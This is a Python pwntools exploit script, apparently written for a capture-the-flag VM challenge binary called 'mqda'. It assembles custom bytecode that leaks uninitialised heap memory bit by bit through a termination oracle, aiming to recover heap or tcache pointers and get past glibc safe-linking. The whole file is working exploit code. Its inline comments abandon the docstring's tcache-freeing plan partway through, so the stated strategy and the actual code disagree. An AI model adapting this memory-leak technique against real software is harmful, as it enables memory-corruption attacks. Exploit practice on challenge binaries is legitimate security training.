#!/usr/bin/env python3
"""
Exploit for mqda VM - Leak tcache metadata from freed pages

Strategy:
1. Allocate page A, write non-zero data
2. Allocate page B, write all zeros (will be freed by cleanup)
3. After cleanup, page B is in tcache with fd pointer
4. Allocate new page at different address - might get page B's chunk
5. Read from new page to get stale tcache metadata (heap address!)
6. Use the leak to compute tcache key for glibc 2.35 safe-linking
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

def pop_reg(reg):
    return bytes([0x03, reg])

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_bit_test_code(read_addr, bit_position, expected_bit):
    """Create code that terminates if bit at read_addr[bit_position] == expected_bit."""
    code = b''
    
    # First, we need to set up the heap by allocating and freeing pages
    # to get tcache metadata in a re-allocated page
    
    # Allocate page 0 with non-zero data (keep alive)
    code += mov_reg_imm(15, 0x00)
    code += mov_reg_imm(0, 0x41414141)
    code += push_reg(0)
    
    # Allocate page 0x100 with zero data (will be freed)
    # Actually, we can't write zeros easily since PUSH writes the register value
    # We need to push 0 at many locations to zero the page
    # But the page header has the VM address, not zero...
    
    # Wait - the cleanup checks if page[4..0x103] is all zeros
    # The page[0..3] is the VM address header
    # So if we never write anything to page data, will it be zeros?
    # Pages are malloc'd and not zeroed, so they have garbage!
    
    # We need to actively zero the page data to trigger free
    # This requires writing 0 to every byte - too many instructions
    
    # Alternative: use the bit-by-bit leak on existing heap data
    # Even without freeing, the pages contain uninitialized heap data
    
    # Let's just read from address 0 (which has our code) and verify
    code += mov_reg_imm(15, read_addr)
    code += pop_reg(0)
    
    if bit_position > 0:
        shl_amount = 31 - bit_position
        if shl_amount > 0:
            code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = len(code)
    hlt_offset = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_offset)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(read_addr, bit_position, expected_bit=1):
    """Test if bit at position equals expected_bit."""
    code = create_bit_test_code(read_addr, bit_position, expected_bit)
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(b'0')
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(b'0')
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(read_addr):
    """Leak a single byte."""
    val = 0
    for bit in range(8):
        if test_bit(read_addr, bit, 1):
            val |= (1 << bit)
    return val

def main():
    print("[*] Tcache metadata leak attempt")
    print("[*] Reading from address 0x100 (fresh page with uninitialized heap data)...")
    
    # Read first 16 bytes from a fresh page that hasn't been written to
    # If the heap chunk was previously used, we might see pointers
    
    data = b''
    for i in range(16):
        byte = leak_byte(0x100 + i)  # Read from page 0x100
        data += bytes([byte])
        print(f"\r[*] Byte {i}: 0x{byte:02x}", end='')
    
    print(f"\n[*] Data: {data.hex()}")
    
    # Check if this looks like a heap address
    if len(data) >= 8:
        qword = u64(data[:8])
        print(f"[*] First qword: 0x{qword:016x}")
        if (qword >> 40) == 0x55 or (qword >> 40) == 0x56:
            print("[+] Looks like a heap address!")

if __name__ == '__main__':
    main()
